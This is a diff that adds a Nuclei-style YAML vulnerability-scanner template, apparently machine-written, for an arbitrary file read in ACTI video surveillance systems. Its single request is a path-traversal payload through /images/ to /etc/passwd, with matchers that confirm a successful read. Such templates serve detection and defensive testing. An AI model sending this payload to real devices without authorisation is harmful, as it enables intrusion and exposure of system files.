@@ -1,0 +1,29 @@
+id: acti-video-surveillance-images-anyfile-read
+info:
+  name: ACTI Video Surveillance Images Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/images/../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
